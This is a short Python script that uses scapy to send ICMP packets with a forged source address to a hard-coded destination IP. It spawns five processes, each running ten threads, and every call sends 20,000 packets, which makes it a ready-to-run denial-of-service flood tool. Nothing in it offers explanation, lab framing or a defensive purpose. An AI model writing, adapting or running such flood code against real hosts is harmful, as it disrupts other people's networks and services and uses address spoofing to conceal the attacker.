import sys
import threading
from queue import Queue
from scapy.all import *
from queue import Queue
import multiprocessing
import os
no_of_process = 5
q = Queue()

def launch():
    p = (IP(src="35.225.200.175", dst="35.193.17.254") / ICMP())
    send(p, count=20000)


NUMBER_OF_WORKERS = 10
NUMBER_OF_JOBS = 10
total_process = []


def create_thread():
    for i in range(NUMBER_OF_WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()


def create_jobs():
    for my_worker in range(NUMBER_OF_JOBS):
        q.put(my_worker)
    q.join()


def worker():
    for x in range(NUMBER_OF_JOBS):
        my_worker = q.get()  # get job and remove from que
        launch()
        q.task_done()  # when task is complete


def run():
    print(f"process id {os.getpid()}")
    create_thread()
    create_jobs()
    worker()


for i in range(0, no_of_process):
    process = multiprocessing.Process(target=run, )
    process.start()
    total_process.append(process)

for i in range (0,no_of_process):

    total_process[i].join()
